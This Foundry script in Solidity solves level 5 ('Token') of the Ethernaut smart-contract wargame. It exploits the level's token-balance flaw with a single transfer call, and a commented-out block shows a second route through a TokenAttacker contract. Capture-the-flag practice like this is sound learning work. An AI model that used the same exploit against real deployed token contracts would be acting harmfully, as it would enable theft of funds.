// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/05-TokenAttacker.sol";

contract TokenSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        IToken(challengeInstance).transfer(challengeInstance, 21);

        /*
        // Use Attacker Contract
        TokenAttacker tokenAttacker = new TokenAttacker(challengeInstance);

        // Method 1: Low-level call
        (, bytes memory returnData) = challengeInstance.call(abi.encodeWithSignature("totalSupply()"));
        uint totalSupply = abi.decode(returnData, (uint));
        console2.log("Method 1 totalSupply:", totalSupply);

        // Method 2: Using interface
        uint totalSupply_ = IToken(challengeInstance).totalSupply();
        console2.log("Method 2 totalSupply:", totalSupply_);

        tokenAttacker.attack(totalSupply);
        */

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(5));
    }
}
